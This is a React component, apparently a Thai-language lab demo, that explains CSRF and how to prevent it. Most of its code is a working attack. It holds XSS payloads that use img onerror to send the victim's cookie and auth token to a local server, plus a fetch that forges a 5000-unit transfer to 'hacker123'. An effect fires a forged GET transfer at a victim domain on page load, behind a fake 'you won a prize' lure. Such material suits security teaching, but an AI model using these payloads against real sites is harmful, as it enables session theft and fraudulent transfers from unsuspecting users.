import { useEffect, useState } from "react";

function CSRF() {


    const [isOpen, setIsOpen] = useState(false);
    useEffect(() => {
        // set the cookie
        document.cookie = "session=12345";
        localStorage.setItem("auth_token", "12345");
    }, []);
    const userInput2 = '<img src="invalid.jpg" onerror="document.location=\'http://localhost:3001?cookie=\'+document.cookie">';

    const userInput3 = `<img src="invalid.jpg" onerror="
    fetch('http://localhost:3001', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + localStorage.getItem('auth_token') // ดึงค่า auth_token จาก localStorage
        },
        credentials: 'include', // ส่ง Cookie ของเหยื่อไปด้วย
        body: JSON.stringify({ toAccount: 'hacker123', amount: 5000 })
    });
    ">
`;

    const handleHack = () => {
        setIsOpen(true);
    }

    const token = localStorage.getItem("auth_token");

    const handleCsrf = () => {
        // fecth the url with the cookie
        fetch("http://localhost:3001", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Authorization": `Bearer ${token}`,
            },
            credentials: "include", // ส่ง Cookie ของเหยื่อไปด้วย
            body: JSON.stringify({ toAccount: "hacker123", amount: 5000 }),
        });
    }

    const textRead = `
     <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    
      margin: 0;
      padding: 2rem;
    }
    .container {
      max-width: 800px;
      margin: auto;
    
      padding: 2rem;
      border-radius: 10px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
    }
    h1 {
      color: #d6336c;
      font-size: 1.8rem;
    }
    p {
      margin-bottom: 1rem;
    }
    ul {
      padding-left: 1.5rem;
      margin-bottom: 1rem;
    }
    li {
      margin-bottom: 0.5rem;
    }
    code {
      
      padding: 2px 6px;
      border-radius: 4px;
      font-size: 0.95rem;
    }
    .highlight {
      color: #0d6efd;
      font-weight: bold;
    }
  </style>
    <div class="container">
    <h1>CSRF (Cross-Site Request Forgery) คืออะไร?</h1>
    <p>
      <strong>CSRF</strong> (อ่านว่า “ซีเอสอาร์เอฟ”) คือช่องโหว่ด้านความปลอดภัยของเว็บแอปพลิเคชัน
      ที่ผู้ไม่หวังดีสามารถ <span class="highlight">“หลอกให้เหยื่อส่งคำสั่ง”</span> ไปยังระบบ
      โดยที่เหยื่อไม่รู้ตัวว่าได้ส่ง request นั้นจริง ๆ
    </p>

    <p>ตัวอย่างเช่น:</p>
    <ul>
      <li>เหยื่อกำลังล็อกอินในเว็บไซต์ธนาคาร</li>
      <li>จากนั้นเปิดอีเมลปลอมที่แฝงโค้ดไว้ เช่น <code>&lt;img src="https://mybank.com/transfer?to=hacker&amp;amount=5000"&gt;</code></li>
      <li>หากระบบธนาคารไม่ป้องกัน CSRF → คำสั่งโอนเงินจะเกิดขึ้นทันที</li>
    </ul>

    <p>สิ่งที่แฮกเกอร์อาจทำได้จาก CSRF:</p>
    <ul>
      <li>เปลี่ยนรหัสผ่านของเหยื่อ</li>
      <li>โพสต์ข้อความโดยชื่อเหยื่อ</li>
      <li>โอนเงิน / ลบข้อมูล</li>
    </ul>

    <p><strong>วิธีป้องกัน CSRF:</strong></p>
    <ul>
      <li>ใช้ <span class="highlight">CSRF Token</span> ในทุก form หรือ request ที่สำคัญ</li>
      <li>ตั้งค่า cookie แบบ <code>SameSite=Strict</code></li>
      <li>ตรวจสอบ <code>Origin</code> หรือ <code>Referer</code> header</li>
      <li>ใช้ OTP หรือ CAPTCHA กับคำสั่งสำคัญ</li>
    </ul>

    <p><strong>สรุป:</strong> CSRF คือการโจมตีที่ทำให้ผู้ใช้ส่งคำสั่งอันตรายโดยไม่ตั้งใจผ่าน session ที่ยังคงอยู่</p>
  </div>`;


    useEffect(() => {
        // โจมตีแบบ GET Request โดยแฝงการส่งคำขอผ่าน <img>
        const attackUrl = "https://victim.com/transfer?to=hacker&amount=5000";
        const img = new Image();
        img.src = attackUrl; // เหยื่อที่ล็อกอินแล้ว request ไปที่เซิร์ฟเวอร์
    }, []);

    return (
        <>
            <div dangerouslySetInnerHTML={{ __html: textRead }}></div>
            {/* <div dangerouslySetInnerHTML={{ __html: userInput2 }} /> */}
            {/* <div dangerouslySetInnerHTML={{ __html: userInput3 }} /> */}
            <div style={{ justifyContent: "center", display: "flex", marginTop: "20%" }}>


                {/* {isOpen ? <div dangerouslySetInnerHTML={{ __html: userInput3 }} /> : <button onClick={handleHack}>Click me</button>} */}


                <h1>คุณได้รับรางวัลพิเศษ! 🎁</h1>
                <p>กำลังโหลดข้อมูล...</p>
                <p>โปรดคลิกที่ลิงก์นี้เพื่อรับรางวัล</p>
            </div>
        </>
    );
}

export default CSRF;
